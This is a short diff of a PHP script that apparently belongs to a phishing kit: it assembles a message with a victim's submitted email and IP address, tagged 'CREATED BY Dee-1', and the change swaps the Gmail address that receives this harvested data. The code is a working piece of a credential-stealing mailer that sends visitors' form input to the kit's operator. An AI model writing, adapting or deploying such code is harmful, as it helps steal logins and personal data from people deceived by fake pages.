@@ -13,7 +13,7 @@ $message .= "--------xX CREATED BY Dee-1 Xx--------\n";
 $message .= "IP : ".$_SERVER['REMOTE_ADDR']." | MR.SM+KK: ".date("g:i:s:a || D-d-M-Y")."\n";
 $message .= "--------------------------------------------------\n";
 
-$send="awesuyinka@gmail.com";
+$send="garybull299@gmail.com";
 $subject = "SMTP | ".$_POST['email']." | $ip";
 $headers = "From: sm+kk<noreply@spammersupport.info>";
 $headers.= "MIME-Version: 1.0\r\n";
